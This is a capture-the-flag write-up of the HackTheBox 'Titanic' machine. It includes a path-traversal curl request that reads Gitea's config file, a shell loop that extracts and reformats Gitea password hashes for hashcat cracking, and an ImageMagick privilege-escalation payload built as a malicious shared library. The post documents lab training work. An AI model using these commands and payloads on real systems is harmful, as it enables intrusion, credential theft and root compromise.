---
title: HackTheBox | Titanic
published: 2025-02-21
description: "In this write-up, I explain how I gained ownership of Titanic on HackTheBox."
image: "./img/image.png"
tags: [CTF, HTB, write-up]
category: 'CTF'
draft: false
---

# Nmap Scan

First, I performed an Nmap scan to identify open ports and running services:

```bash
sudo nmap -sC -sV -T4 10.10.11.55
```

![nmap](image.png)

## Website Enumeration

While exploring the website, I found a **Book Your Trip** button that triggers a form submission.

![button](image-1.png)

After filling out the form and intercepting the request with **BurpSuite**, I followed the redirection and discovered a vulnerable endpoint: `/download?ticket=`.

## Path Traversal Exploit

By attempting **path traversal**, I successfully accessed restricted files. I found a user named **developer** and retrieved the user flag from:

```
/home/developer/user.txt
```

![pathtraversal](image-2.png)

## Subdomain Discovery

I continued testing path traversal to access system files like `/etc/hosts`. I discovered a **subdomain** named `dev`.

![dev](image-3.png)

I added the subdomain to my `/etc/hosts` file:

## Exploiting Gitea for Credentials

The application was running **Gitea**. Searching for its configuration file, I found:

```bash
curl -X GET "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini"
```

![config](image-4.png)

From the configuration, I located the database at:

```
/data/gitea/gitea.db
```

accessed it using **SQLite**:

```bash
sqlite3 _home_developer_gitea_data_gitea_gitea.db
```

![db](image-5.png)

## Cracking the Hash

from the `htb-compiled` write-up, I extracted and cracked the hash:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do
  digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64);
  salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64);
  name=$(echo $data | cut -d'|' -f3);
  echo "${name}:sha256:50000:${salt}:${digest}";
done | tee gitea.hashes

hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

![pass](image-6.png)

## SSH Access

Using the cracked password, I logged into the machine via SSH:

```bash
ssh developer@10.10.11.55
```

## Privilege Escalation

While exploring the system, I found a script running as **root** at `/opt/scripts`:

![scripts](image-7.png)

The script used an **ImageMagick** version vulnerable to **Arbitrary Code Execution**. A quick Google search led me to this PoC:

[Arbitrary Code Execution in `AppImage` version `ImageMagick`](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root44_flag.txt");
    exit(0);
}
EOF

touch test.jpg
```

## Retrieving the Root Flag

After triggering the exploit, I retrieved the **root flag** from `/tmp/root44_flag.txt`.

![win](image-8.png)

## Conclusion

This box involved a mix of **web enumeration, path traversal, database extraction, password cracking, and privilege escalation via ImageMagick**. A great learning experience!

